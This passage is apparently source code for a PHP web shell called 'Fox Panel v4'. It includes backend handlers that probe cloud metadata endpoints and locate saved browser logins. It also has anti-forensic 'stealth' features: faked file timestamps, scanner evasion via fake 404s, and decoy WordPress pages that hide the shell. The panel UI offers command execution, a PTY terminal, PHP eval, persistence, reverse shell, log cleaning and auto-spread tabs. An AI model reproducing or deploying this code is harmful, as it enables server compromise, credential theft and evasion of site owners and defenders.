            $ali = @file_get_contents('http://100.100.100.200/latest/meta-data/',false,stream_context_create(['http'=>['timeout'=>2]])); $results[] = ['endpoint'=>'Alibaba','accessible'=>!empty($ali),'data'=>$ali?substr($ali,0,500):null];
            json_exit(['ok'=>true,'results'=>$results]);
        }
        if ($action === 'browsers') {
            $b = []; $home=$_SERVER['HOME']??'/root'; $up=getenv('USERPROFILE');
            foreach ([$home.'/.config/google-chrome/Default/Login Data', $up.'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'] as $p) { if (file_exists($p)) $b[]=['name'=>'Chrome','path'=>$p,'exists'=>true,'size'=>filesize($p)]; }
            $ff=$home.'/.mozilla/firefox/'; if (is_dir($ff)) foreach (@glob($ff.'*.default*')?:[] as $pf) { $l=$pf.'/logins.json'; if(file_exists($l)) $b[]=['name'=>'Firefox','profiles'=>[['path'=>$l,'size'=>filesize($l)]]]; }
            json_exit(['ok'=>true,'browsers'=>$b]);
        }
        json_exit(['error'=>'Unknown harvest action']);
    }

    // Phase 8: Stealth
    if ($mode === 'stealth') {
        $action = $_REQUEST['action'] ?? '';
        $pr = substr(md5(__FILE__),0,8); $sf = __DIR__."/.f0x_stealth_{$pr}.dat";
        if ($action === 'status') {
            $cfg = []; if (file_exists($sf)) { $r=@file_get_contents($sf); if ($r) $cfg=@json_decode(fox_xor($r,md5(__FILE__)),true)?:[]; }
            json_exit(['ok'=>true,'shield_active'=>!isset($cfg['shield'])||$cfg['shield'],'overt_mode'=>$cfg['overt']??'random','encrypt_payload'=>!empty($cfg['encrypt']),'suspicious_log'=>file_exists(__DIR__.'/.f0x_ua.log'),'fake_timestamps'=>!empty($cfg['fake_ts'])]);
        }
        if ($action === 'toggle_shield') {
            $cfg = []; if (file_exists($sf)) { $r=@file_get_contents($sf); if ($r) $cfg=@json_decode(fox_xor($r,md5(__FILE__)),true)?:[]; }
            $cfg['shield'] = empty($cfg['shield']); @file_put_contents($sf, fox_xor(json_encode($cfg),md5(__FILE__))); json_exit(['ok'=>true,'shield_active'=>$cfg['shield']]);
        }
        if ($action === 'overt_mode') {
            $m = $_POST['mode_val']??'random'; if (!in_array($m,['random','wp_config','404','htaccess','login'])) $m='random';
            $cfg = []; if (file_exists($sf)) { $r=@file_get_contents($sf); if ($r) $cfg=@json_decode(fox_xor($r,md5(__FILE__)),true)?:[]; }
            $cfg['overt']=$m; @file_put_contents($sf, fox_xor(json_encode($cfg),md5(__FILE__))); json_exit(['ok'=>true,'overt_mode'=>$m]);
        }
        if ($action === 'fake_timestamps') {
            $paths = explode("\n",trim($_POST['paths']??__FILE__)); $days=(int)($_POST['days']??30); $t=0;
            foreach ($paths as $p) { $p=trim($p); if (!$p||!file_exists($p)) continue; fox_fake_touch($p,$days); $t++; }
            $cfg=[]; if (file_exists($sf)) { $r=@file_get_contents($sf); if ($r) $cfg=@json_decode(fox_xor($r,md5(__FILE__)),true)?:[]; }
            $cfg['fake_ts']=true; @file_put_contents($sf, fox_xor(json_encode($cfg),md5(__FILE__))); json_exit(['ok'=>true,'touched'=>$t,'days_ago'=>$days]);
        }
        if ($action === 'suspicious_log') {
            $lf = __DIR__.'/.f0x_ua.log';
            if (!empty($_POST['clear'])) { @unlink($lf); json_exit(['ok'=>true,'cleared'=>true]); }
            $entries = []; if (file_exists($lf)) foreach (array_slice(@file($lf)?:[],-100) as $l) $entries[]=trim($l);
            json_exit(['ok'=>true,'count'=>count($entries),'entries'=>$entries]);
        }
        json_exit(['error'=>'Unknown stealth action']);
    }

    // PTY Terminal
    if ($mode === 'pty') {
        $action = $_REQUEST['action'] ?? '';
        if ($action === 'start') { $m = fox_pty_start(); json_exit($m ? ['ok'=>true,'sid'=>$m['sid']] : ['error'=>'PTY start failed']); }
        if ($action === 'write') { $sid = $_REQUEST['sid']??''; $data = $_REQUEST['data']??''; fox_pty_write($sid, $data); json_exit(['ok'=>true]); }
        if ($action === 'read') { $sid = $_REQUEST['sid']??''; $offset = intval($_REQUEST['offset']??0); $r = fox_pty_read($sid, $offset); if ($r === false) json_exit(['error'=>'Session not found']); json_exit(['ok'=>true,'data'=>$r['data'],'offset'=>$r['offset']]); }
        if ($action === 'kill') { $sid = $_REQUEST['sid']??''; fox_pty_kill($sid); json_exit(['ok'=>true]); }
        if ($action === 'resize') { $sid=$_REQUEST['sid']??''; $cols=intval($_REQUEST['cols']??80); $rows=intval($_REQUEST['rows']??24); fox_pty_resize($sid,$cols,$rows); json_exit(['ok'=>true]); }
        json_exit(['error'=>'Unknown pty action']);
    }

    // Persist
    if ($mode === 'persist') {
        $action = $_REQUEST['action'] ?? '';
        if ($action === 'install') { $type = $_POST['type'] ?? 'all'; $r = fox_persist_install($type); json_exit($r); }
        if ($action === 'remove') { $type = $_POST['type'] ?? 'all'; $r = fox_persist_remove($type); json_exit($r); }
        if ($action === 'status') { $methods = fox_persist_status(); json_exit(['ok'=>true,'methods'=>$methods]); }
        if ($action === 'wipe') { fox_persist_wipe(); json_exit(['ok'=>true]); }
        if ($action === 'shield') { $tmp=sys_get_temp_dir(); $pr=substr(md5(__FILE__),0,8); $f="$tmp/.f0x_shield_$pr"; if(file_exists($f)){@unlink($f);$enabled=false;}else{touch($f);$enabled=true;} json_exit(['ok'=>true,'enabled'=>$enabled]); }
        json_exit(['error'=>'Unknown persist action']);
    }

    // Catch-all
    json_exit(['error'=>'Unknown mode']);
}

/* ──────────────── Phase 8: Enhanced Self-Obfuscation & Scanner Shield ─── */
// Scanner check
if (fox_shield_check()) {
    header('HTTP/1.0 404 Not Found');
    echo '<!DOCTYPE html><html><head><title>404</title></head><body><h1>404 Not Found</h1><p>The requested resource was not found.</p></body></html>';
    exit;
}
// Self-obfuscation: serve fake content on direct GET
if (!$IS_AUTH && empty($mode) && $_SERVER['REQUEST_METHOD'] === 'GET' && empty($_POST)) {
    $overt_mode = 'random';
    $pr = substr(md5(__FILE__),0,8); $sf = __DIR__."/.f0x_stealth_{$pr}.dat";
    if (file_exists($sf)) { $r=@file_get_contents($sf); if($r){$cfg=@json_decode(fox_xor($r,md5(__FILE__)),true); if(!empty($cfg['overt'])) $overt_mode=$cfg['overt']; } }
    $fakes = [
        'wp_config' => '<?php
define("DB_NAME","database_name_here");define("DB_USER","username_here");define("DB_PASSWORD","password_here");
define("DB_HOST","localhost");define("DB_CHARSET","utf8");define("DB_COLLATE","");
define("AUTH_KEY","'.bin2hex(random_bytes(8)).'");define("SECURE_AUTH_KEY","'.bin2hex(random_bytes(8)).'");
$table_prefix="wp_";if(!defined("ABSPATH"))define("ABSPATH",__DIR__."/");require_once ABSPATH."wp-settings.php";',
        '404' => '<!DOCTYPE html><html><head><title>404 Not Found</title><style>body{font-family:sans-serif;text-align:center;padding:80px 20px;color:#444}h1{font-size:72px;margin:0;color:#ddd}p{font-size:18px}</style></head><body><h1>404</h1><p>Not Found</p><hr><small>'.($_SERVER['SERVER_SOFTWARE']??'Apache').'</small></body></html>',
        'htaccess' => '#BEGIN WordPress'."\n".'<IfModule mod_rewrite.c>'."\n".'RewriteEngine On'."\n".'RewriteBase /'."\n".'RewriteRule ^index\.php$ - [L]'."\n".'</IfModule>'."\n".'#END WordPress',
        'login' => '<!DOCTYPE html><html><head><title>WordPress Login</title><meta charset="utf-8"><meta name="viewport" content="width=device-width"><style>body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f0f1;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}#login{background:#fff;padding:30px;border-radius:8px;box-shadow:0 0 20px rgba(0,0,0,.1);width:320px;text-align:center}h1{font-size:24px;color:#3c434a;margin-bottom:24px}label{display:block;text-align:left;font-size:13px;color:#50575e;margin-bottom:4px}input[type=text],input[type=password]{width:100%;padding:8px 12px;border:1px solid #8c8f94;border-radius:4px;font-size:14px;margin-bottom:16px;box-sizing:border-box}input[type=submit]{width:100%;padding:10px;background:#2271b1;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer}input[type=submit]:hover{background:#135e96}.error{color:#d63638;font-size:13px;margin-bottom:12px}</style></head><body><div id="login"><h1>WordPress</h1><form method="post"><div class="error">ERROR: Invalid username or password.</div><label>Username</label><input type="text" name="log" value="admin"><label>Password</label><input type="password" name="pwd"><input type="submit" value="Log In"></form></div></body></html>',
    ];
    if ($overt_mode === 'login') { header('Content-Type: text/html; charset=utf-8'); echo $fakes['login']; }
    else { header('Content-Type: text/plain; charset=utf-8');
        echo ($overt_mode !== 'random' && isset($fakes[$overt_mode])) ? $fakes[$overt_mode] : $fakes[array_rand(['wp_config','404','htaccess'])];
    }
    exit;
} ?>
<!-- LOGIN PAGE (when not authenticated) -->
<?php if (!$IS_AUTH) { $rl = fox_rate_limit_check(); $blocked = $rl['blocked']; ?>
<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Database Connection Error</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}.login-card{background:#fff;border-radius:12px;padding:40px;width:100%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,.3)}.login-card h1{font-size:18px;color:#333;margin-bottom:4px;display:flex;align-items:center;gap:8px}.login-card .sub{color:#888;font-size:13px;margin-bottom:24px;line-height:1.5}.login-card .error-box{background:#fef2f2;border:1px solid #fecaca;color:#dc2626;padding:10px 14px;border-radius:8px;font-size:13px;margin-bottom:16px;display:none}.login-card label{display:block;font-size:13px;color:#555;margin-bottom:4px;font-weight:500}.login-card input[type=password]{width:100%;padding:10px 14px;border:2px solid #e5e7eb;border-radius:8px;font-size:14px;transition:border-color .2s;outline:none}.login-card input[type=password]:focus{border-color:#667eea}.login-card button{width:100%;padding:12px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:opacity .2s;margin-top:8px}.login-card button:hover{opacity:.9}.login-card .hint{color:#aaa;font-size:11px;text-align:center;margin-top:16px}.login-card .blocked{color:#dc2626;font-size:13px;text-align:center;padding:10px;background:#fef2f2;border-radius:8px}</style></head><body>
<div class="login-card"><h1><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2"><path d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg> Database Connection Error</h1>
<div class="sub">The application could not connect to the database server.<br>Please contact the administrator.</div>
<?php if ($blocked) { ?><div class="blocked"><strong>Access Temporarily Blocked</strong><br>Too many failed attempts. Please try again later.</div><?php } else { ?>
<div class="error-box" id="loginError"></div><label for="dbPass">Database Password</label>
<input type="password" id="dbPass" placeholder="Enter password..." autofocus>
<button onclick="doLogin()">Authenticate</button>
<div class="hint">MySQL connection error #2002</div><?php } ?></div>
<script>function doLogin(){var key=document.getElementById('dbPass').value;var xhr=new XMLHttpRequest();xhr.open('POST','?m=login',true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.onload=function(){try{var r=JSON.parse(xhr.responseText);if(r.ok){window.location.reload()}else{document.getElementById('loginError').textContent=r.error||'Invalid password.';document.getElementById('loginError').style.display='block'}}catch(e){document.getElementById('loginError').textContent='Server error.';document.getElementById('loginError').style.display='block'}};xhr.onerror=function(){document.getElementById('loginError').textContent='Connection failed.';document.getElementById('loginError').style.display='block'};xhr.send('key='+encodeURIComponent(key))}document.addEventListener('DOMContentLoaded',function(){var pf=document.getElementById('dbPass');if(pf)pf.addEventListener('keydown',function(e){if(e.key==='Enter')doLogin()})});</script></body></html>
<?php exit; } ?>
<!-- PANEL TEMPLATE (when authenticated) -->
<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Fox Panel v4 — <?= $HOSTNAME ?></title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm/css/xterm.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}:root{--bg:#0a0a12;--surface:#0f0f1a;--card:#14141f;--border:#1a1a2a;--text:#e0e0e0;--muted:#666;--primary:#6366f1;--red:#ef4444;--green:#22c55e;--blue:#3b82f6;--yellow:#eab308;--orange:#f97316;--purple:#a855f7;--pink:#ec4899}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);font-size:13px;overflow:hidden;height:100vh}
.layout{display:flex;height:100vh;overflow:hidden}
.sidebar{width:48px;background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow-y:auto;flex-shrink:0;padding-top:8px;z-index:10}
.sidebar::-webkit-scrollbar{width:2px}.sidebar::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
.nav-item{padding:10px 12px;cursor:pointer;text-align:center;color:var(--muted);transition:all .15s;font-size:16px;border-left:2px solid transparent;position:relative}
.nav-item:hover{color:var(--text);background:rgba(255,255,255,.03)}
.nav-item.active{color:var(--primary)!important;border-left-color:var(--primary);background:rgba(99,102,241,.08)}
.nav-item span{display:none;position:absolute;left:52px;top:50%;transform:translateY(-50%);background:var(--card);color:var(--text);padding:4px 10px;border-radius:4px;font-size:11px;white-space:nowrap;z-index:100;border:1px solid var(--border);pointer-events:none}
.nav-item:hover span{display:block}
.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
.toolbar{background:var(--surface);border-bottom:1px solid var(--border);padding:6px 16px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;font-size:12px;min-height:38px}
.toolbar .sep{color:var(--muted);font-size:16px;padding:0 4px}
#serverInfo{color:var(--muted);font-size:10px;margin-left:auto;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.content{flex:1;overflow-y:auto;padding:16px;background:var(--bg)}
.content::-webkit-scrollbar{width:6px}.content::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
.card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:14px;margin-bottom:10px}
.card h3{font-size:13px;font-weight:600;margin-bottom:10px;display:flex;align-items:center;gap:8px}
.loading{text-align:center;padding:40px;color:var(--muted);font-size:13px}
.empty-state{text-align:center;padding:40px 20px;color:var(--muted)}
.empty-state i{font-size:32px;margin-bottom:12px;display:block}
.text-muted{color:var(--muted)}.text-green{color:var(--green)}.text-red{color:var(--red)}
.flex{display:flex;align-items:center;gap:8px;flex-wrap:wrap}.flex-wrap{flex-wrap:wrap}.gap-4{gap:4px}.gap-8{gap:8px}.mt-4{margin-top:4px}.mt-8{margin-top:8px}.mb-4{margin-bottom:4px}.mb-8{margin-bottom:8px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}.grid-2{grid-template-columns:1fr 1fr}.grid-3{grid-template-columns:1fr 1fr 1fr}
@media(max-width:900px){.grid,.grid-2,.grid-3{grid-template-columns:1fr}}
.btn{background:#1a1a2a;color:var(--text);border:1px solid var(--border);padding:6px 14px;border-radius:5px;cursor:pointer;font-size:12px;transition:all .15s;display:inline-flex;align-items:center;gap:5px}
.btn:hover{background:#2a2a3a;border-color:#3a3a5a}.btn-primary{background:var(--primary);border-color:var(--primary);color:#fff}.btn-primary:hover{opacity:.9}.btn-success{background:var(--green);border-color:var(--green);color:#fff}.btn-danger{background:var(--red);border-color:var(--red);color:#fff}.btn-sm{padding:3px 10px;font-size:10px}
input,select,textarea{background:#0d0d18;border:1px solid var(--border);border-radius:5px;color:var(--text);padding:6px 10px;font-size:12px;outline:none;transition:border-color .2s;font-family:inherit}
input:focus,select:focus,textarea:focus{border-color:var(--primary)}
input[type=text],input[type=password]{width:auto}
.tbl{width:100%;border-collapse:collapse;font-size:11px}.tbl th{text-align:left;padding:6px 8px;border-bottom:1px solid var(--border);color:var(--muted);font-weight:500;font-size:10px;text-transform:uppercase}.tbl td{padding:5px 8px;border-bottom:1px solid rgba(255,255,255,.03);vertical-align:middle}
.tbl tr:hover{background:rgba(255,255,255,.02)}
pre{font-family:'Cascadia Code','Fira Code','JetBrains Mono',monospace;font-size:12px;line-height:1.4}
.toast{position:fixed;bottom:20px;right:20px;background:var(--card);border:1px solid var(--border);padding:12px 20px;border-radius:8px;z-index:10000;font-size:12px;box-shadow:0 10px 30px rgba(0,0,0,.5);animation:slideIn .25s;max-width:300px}
.toast.error{border-color:var(--red)}.toast.success{border-color:var(--green)}
@keyframes slideIn{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.7);z-index:9999;display:flex;justify-content:center;align-items:center;padding:20px}
.modal{background:var(--card);border:1px solid var(--border);border-radius:12px;max-width:800px;width:100%;max-height:80vh;overflow:auto;padding:20px}
.modal h3{font-size:14px;margin-bottom:12px}
.hub-item{display:flex;align-items:center;gap:8px;background:#0d0d15;border:1px solid var(--border);border-radius:6px;padding:8px 12px;margin-bottom:4px;font-size:11px}
.dot{width:8px;height:8px;border-radius:50%;background:var(--muted);flex-shrink:0;display:inline-block}.dot.alive{background:var(--green)}.dot.dead{background:var(--red)}
::-webkit-scrollbar{width:6px;height:6px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:#2a2a3a;border-radius:4px}
</style></head><body>
<div class="layout"><div class="sidebar">
<div class="nav-item" onclick="switchTab('files')" data-tab="files"><i class="fas fa-folder"></i><span>Files</span></div>
<div class="nav-item" onclick="switchTab('cmd')" data-tab="cmd"><i class="fas fa-terminal"></i><span>Command</span></div>
<div class="nav-item" onclick="switchTab('term')" data-tab="term"><i class="fas fa-keyboard"></i><span>Terminal</span></div>
<div class="nav-item" onclick="switchTab('ps')" data-tab="ps"><i class="fas fa-microchip"></i><span>Processes</span></div>
<div class="nav-item" onclick="switchTab('sql')" data-tab="sql"><i class="fas fa-database"></i><span>SQL</span></div>
<div class="nav-item" onclick="switchTab('users')" data-tab="users"><i class="fas fa-users"></i><span>Users</span></div>
<div class="nav-item" onclick="switchTab('wp')" data-tab="wp"><i class="fab fa-wordpress"></i><span>WP Manager</span></div>
<div class="nav-item" onclick="switchTab('network')" data-tab="network"><i class="fas fa-network-wired"></i><span>Network</span></div>
<div class="nav-item" onclick="switchTab('proxy')" data-tab="proxy"><i class="fas fa-route"></i><span>Proxy</span></div>
<div class="nav-item" onclick="switchTab('harvest')" data-tab="harvest"><i class="fas fa-key"></i><span>Harvest</span></div>
<div class="nav-item" onclick="switchTab('revshell')" data-tab="revshell"><i class="fas fa-skull"></i><span>Rev Shell</span></div>
<div class="nav-item" onclick="switchTab('search')" data-tab="search"><i class="fas fa-search"></i><span>File Search</span></div>
<div class="nav-item" onclick="switchTab('logs')" data-tab="logs"><i class="fas fa-broom"></i><span>Log Cleaner</span></div>
<div class="nav-item" onclick="switchTab('persist')" data-tab="persist"><i class="fas fa-shield-alt"></i><span>Persistence</span></div>
<div class="nav-item" onclick="switchTab('stealth')" data-tab="stealth"><i class="fas fa-user-secret"></i><span>Stealth</span></div>
<div class="nav-item" onclick="switchTab('cron')" data-tab="cron"><i class="fas fa-clock"></i><span>Cron</span></div>
<div class="nav-item" onclick="switchTab('spread')" data-tab="spread"><i class="fas fa-bolt"></i><span>Auto-Spread</span></div>
<div class="nav-item" onclick="switchTab('hub')" data-tab="hub"><i class="fas fa-globe"></i><span>Multi-Shell</span></div>
<div class="nav-item" onclick="switchTab('bench')" data-tab="bench"><i class="fas fa-tachometer-alt"></i><span>Benchmark</span></div>
<div class="nav-item" onclick="switchTab('eval')" data-tab="eval"><i class="fas fa-code"></i><span>PHP Eval</span></div>
<div class="nav-item" onclick="switchTab('info')" data-tab="info"><i class="fas fa-info-circle"></i><span>PHP Info</span></div>
<div class="nav-item" onclick="doLogout()" style="margin-top:8px;border-top:1px solid #1a1a2a;padding-top:8px;border-radius:0;color:var(--red)"><i class="fas fa-sign-out-alt"></i><span>Logout</span></div>
</div>
<div class="main"><div class="toolbar" id="fileToolbar" style="display:none">
<button class="btn btn-sm" onclick="goUp()"><i class="fas fa-arrow-up"></i></button>
<button class="btn btn-sm" onclick="loadDir(ROOT)"><i class="fas fa-home"></i></button>
<span id="currentPath" class="text-muted" style="font-size:11px"></span>
<span id="serverInfo" style="margin-left:auto;font-size:10px;color:var(--muted)"><?=$HOSTNAME?> | <?=$USER?> | <?=$OS?></span>
</div>
<div class="content" id="fileContent"><div class="loading"><i class="fas fa-spinner fa-spin fa-2x"></i><br>Loading...</div></div></div></div>

<script>var ROOT = <?= json_encode($ROOT_DIR) ?>;
var BASE = '?';
var IS_WIN = <?= $IS_WIN ? 'true' : 'false' ?>;
var CUR_PATH = ROOT;
var CUR_TAB = 'files';

function $(id){return document.getElementById(id)}
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
function humanSize(b){if(b>=1073741824)return (b/1073741824).toFixed(1)+' GB';if(b>=1048576)return (b/1048576).toFixed(1)+' MB';if(b>=1024)return (b/1024).toFixed(1)+' KB';return b+' B'}
function api(m,data,cb){var x=new XMLHttpRequest(),p='ajax=1&m='+encodeURIComponent(m);if(data)for(var k in data)p+='&'+encodeURIComponent(k)+'='+encodeURIComponent(data[k]);x.open('POST',BASE,true);x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');x.onload=function(){if(x.status===403){window.location.reload();return}try{cb(JSON.parse(x.responseText))}catch(e){cb({error:'Parse error'})}};x.onerror=function(){cb({error:'Request failed'})};x.send(p)}
function showToast(t,c){var d=document.createElement('div');d.className='toast'+(c?' '+c:'');d.textContent=t;document.body.appendChild(d);setTimeout(function(){d.style.opacity='0';d.style.transition='opacity .3s';setTimeout(function(){document.body.removeChild(d)},300)},2500)}
function showModal(t,c){var o=document.createElement('div');o.className='modal-overlay';o.innerHTML='<div class="modal"><h3>'+esc(t)+'</h3>'+c+'</div>';o.onclick=function(e){if(e.target===o)document.body.removeChild(o)};document.body.appendChild(o)}
function humanSize(b){if(b>=1073741824)return (b/1073741824).toFixed(1)+' GB';if(b>=1048576)return (b/1048576).toFixed(1)+' MB';if(b>=1024)return (b/1024).toFixed(1)+' KB';return b+' B'}
function switchTab(t){CUR_TAB=t;document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active')});var s=document.querySelector('.nav-item[data-tab="'+t+'"]');if(s)s.classList.add('active');var c=$('fileContent');$('fileToolbar').style.display=(t==='files')?'flex':'none';$('loader').style.display='none';switch(t){
case'files':loadDir(CUR_PATH);break;case'cmd':renderCmd();break;case'term':renderTerm();break;case'ps':renderPS();break;case'sql':renderSQL();break;case'users':loadUsers();break;case'wp':renderWP();break;case'network':renderNet();break;case'proxy':renderProxy();break;case'harvest':renderHarvest();break;case'revshell':renderRev();break;case'search':renderSearch();break;case'logs':renderLogs();break;case'persist':renderPersist();break;case'stealth':renderStealth();break;case'cron':renderCron();break;case'spread':renderSpread();break;case'hub':renderHub();break;case'bench':renderBench();break;case'eval':c.innerHTML='<textarea style="width:100%;min-height:120px;background:#08080d;border:1px solid var(--border);border-radius:5px;color:var(--text);font-family:monospace;font-size:12px;padding:12px" id="evalCode">phpinfo();</textarea><button class="btn btn-primary mt-8" onclick="doEval()"><i class="fas fa-play"></i> Execute</button><pre id="evalOut" class="mt-8" style="background:#08080d;border-radius:5px;padding:12px;font-size:11px;overflow:auto"></pre>';break;case'info':c.innerHTML='<div id="phpInfoContent" class="loading"><i class="fas fa-spinner"></i><br>Loading...</div>';api('phpinfo',{},function(r){if(r.html)$('phpInfoContent').innerHTML=r.html});break;
}}</script>
<script>
/* ═══════════════════════════════════════════════════════════════════════════════
   PHASE 1-5: PANEL RENDER FUNCTIONS
   ═══════════════════════════════════════════════════════════════════════════════ */
function renderCmd() {
    $('fileContent').innerHTML='<div id="cmdPanel"><div class="card"><div style="display:flex;gap:8px;margin-bottom:8px"><input id="cmdInput" placeholder="Enter command..." style="flex:1;background:#08080d;border:1px solid var(--border);border-radius:4px;color:var(--text);padding:8px 12px;font-family:monospace;font-size:13px" onkeydown="if(event.key===\'Enter\')execCmd()"/><button class="btn btn-primary" onclick="execCmd()"><i class="fas fa-terminal"></i> Run</button></div><div id="cmdHistory" style="background:#08080d;border-radius:5px;padding:12px;font-family:monospace;font-size:11px;max-height:500px;overflow:auto;white-space:pre-wrap;color:var(--green)"></div></div></div>';
}
function execCmd(){
    var c=$('cmdInput').value;if(!c)return;$('cmdHistory').innerHTML='<span class="text-muted"><i class="fas fa-spinner fa-spin"></i> Running...</span>';
    api('cmd',{c:c},function(r){$('cmdHistory').innerHTML=esc(r.output||'No output')+(r.error?'<br><span style="color:var(--red)">'+esc(r.error)+'</span>':'');});
}
function renderTerm() {
    $('fileContent').innerHTML='<div id="termPanel"><div class="card"><h3><i class="fas fa-terminal" style="color:var(--green)"></i> Web Terminal</h3><p class="text-muted mb-8">Interactive shell through server</p><div style="background:#08080d;border-radius:5px;padding:12px;font-family:monospace;font-size:11px;min-height:350px;max-height:500px;overflow:auto" id="termOutput"><span class="text-muted">Terminal ready. Enter commands below.</span></div><div style="display:flex;gap:8px;margin-top:8px"><span id="termPrompt" style="color:var(--green);font-family:monospace;font-size:13px;line-height:32px">$</span><input id="termInput" style="flex:1;background:#08080d;border:1px solid var(--border);border-radius:4px;color:var(--text);padding:8px 12px;font-family:monospace;font-size:13px" onkeydown="if(event.key===\'Enter\')termExec()"/></div></div></div>';
}
function termExec(){
    var c=$('termInput').value;if(!c)return;var o=$('termOutput');o.innerHTML+='<br><span style="color:var(--blue)">$ '+esc(c)+'</span><br>';o.innerHTML+='<span class="text-muted"><i class="fas fa-spinner fa-spin"></i></span>';o.scrollTop=o.scrollHeight;$('termInput').value='';
    api('cmd',{c:c},function(r){o.innerHTML=o.innerHTML.replace(/<span class="text-muted">.*?<\/span>/,'')+(r.output?'<span>'+esc(r.output)+'</span>':'<span class="text-muted">No output</span>');o.scrollTop=o.scrollHeight;});
}
function renderPS() {
    $('fileContent').innerHTML='<div class="card"><h3><i class="fas fa-tasks" style="color:var(--blue)"></i> Process List</h3><div id="psList" class="loading"><i class="fas fa-spinner fa-spin"></i><br>Loading...</div></div>';
    api('ps',{},function(r){
        if(r.error){$('psList').innerHTML='<span style="color:var(--red)">'+esc(r.error)+'</span>';return;}
        if(!r.list||r.list.length===0){$('psList').innerHTML='<span class="text-muted">No process data</span>';return;}
        var h='<table class="tbl" style="width:100%"><thead><tr><th>PID</th><th>User</th><th>CPU%</th><th>MEM%</th><th>Command</th></tr></thead><tbody>';
        for(var i=0;i<r.list.length;i++){var p=r.list[i];h+='<tr><td>'+p.pid+'</td><td style="font-size:10px">'+esc(p.user||'')+'</td><td>'+(p.cpu||'')+'</td><td>'+(p.mem||'')+'</td><td style="font-size:10px;max-width:400px;overflow:hidden;text-overflow:ellipsis">'+esc(p.cmd||p.command||'')+'</td></tr>';}
        h+='</tbody></table>';$('psList').innerHTML=h;
    });
}
function loadUsers() {
    $('fileContent').innerHTML='<div class="card"><h3><i class="fas fa-users" style="color:var(--orange)"></i> System Users</h3><div id="usersList" class="loading"><i class="fas fa-spinner fa-spin"></i><br>Loading...</div></div>';
    api('users',{},function(r){
        if(r.error){$('usersList').innerHTML='<span style="color:var(--red)">'+esc(r.error)+'</span>';return;}
        if(!r.users||r.users.length===0){$('usersList').innerHTML='<span class="text-muted">No users found</span>';return;}
        var h='<table class="tbl" style="width:100%"><thead><tr><th>User</th><th>UID</th><th>GID</th><th>Home</th><th>Shell</th></tr></thead><tbody>';
        for(var i=0;i<r.users.length;i++){var u=r.users[i];h+='<tr><td>'+esc(u.name||u.user||'')+'</td><td>'+(u.uid||'')+'</td><td>'+(u.gid||'')+'</td><td style="font-size:10px">'+esc(u.home||'')+'</td><td style="font-size:10px">'+esc(u.shell||'')+'</td></tr>';}
        h+='</tbody></table>';$('usersList').innerHTML=h;
    });
}
function renderSQL() {
    $('fileContent').innerHTML='<div id="sqlPanel"><div class="card"><h3><i class="fas fa-database" style="color:var(--blue)"></i> SQL Query</h3><select id="sqlDriver" style="background:#08080d;border:1px solid var(--border);border-radius:4px;color:var(--text);padding:6px;margin-bottom:8px;font-size:11px"><option value="mysql">MySQL</option><option value="mysqli">MySQLi</option><option value="sqlite">SQLite</option><option value="pgsql">PostgreSQL</option></select><textarea id="sqlQuery" rows="3" style="width:100%;background:#08080d;border:1px solid var(--border);border-radius:4px;color:var(--text);padding:8px;font-family:monospace;font-size:11px" placeholder="SELECT * FROM users LIMIT 10">SHOW TABLES</textarea><button class="btn btn-primary mt-8" onclick="doSQL()"><i class="fas fa-play"></i> Execute</button><div id="sqlResult" class="mt-8" style="font-size:11px;overflow:auto"></div></div></div>';
}
function doSQL() {
    var q=$('sqlQuery').value;var drv=$('sqlDriver').value;$('sqlResult').innerHTML='<div class="loading"><i class="fas fa-spinner fa-spin"></i><br>Running...</div>';
    api('sql',{query:q,driver:drv},function(r){
        if(r.error){$('sqlResult').innerHTML='<span style="color:var(--red)">'+esc(r.error)+'</span>';return;}
        if(!r.columns||!r.rows){$('sqlResult').innerHTML='<span class="text-muted">Query executed ('+r.affected+' rows affected)</span>';return;}
        var h='<table class="tbl" style="width:100%"><thead><tr>';for(var i=0;i<r.columns.length;i++)h+='<th>'+esc(r.columns[i])+'</th>';h+='</tr></thead><tbody>';
        for(var i=0;i<r.rows.length;i++){h+='<tr>';for(var j=0;j<r.rows[i].length;j++)h+='<td style="font-size:10px">'+esc(String(r.rows[i][j]))+'</td>';h+='</tr>';}
